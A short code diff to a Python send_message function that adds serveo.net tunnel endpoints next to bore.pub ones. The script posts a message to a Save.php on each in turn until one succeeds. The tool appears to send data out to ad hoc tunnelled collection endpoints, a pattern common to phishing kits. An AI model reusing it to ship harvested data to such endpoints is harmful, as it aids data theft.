@@ -89,6 +89,9 @@ def send_message():
                 f'http://bore.pub:{Tport}/Save.php',
                 f'http://bore.pub:{Tport1}/Save.php',  
                 f'http://bore.pub:{Tport2}/Save.php',
+                f'https://serveo.net:{Tport}/Save.php',
+                f'https://serveo.net:{Tport1}/Save.php',  
+                f'https://serveo.net:{Tport2}/Save.php',
             ]
 
             for url in urls:
@@ -98,7 +101,7 @@ def send_message():
                     if response.status_code == 200:
                         RE = colored("[+] Sended","green")
                         print(f"{RE}")
-                        break  # Exit the loop if the message was sent successfully
+                        break  
                     else:
                      FL = colored("[-] Not Sended","red")
                      print(f"{FL}")
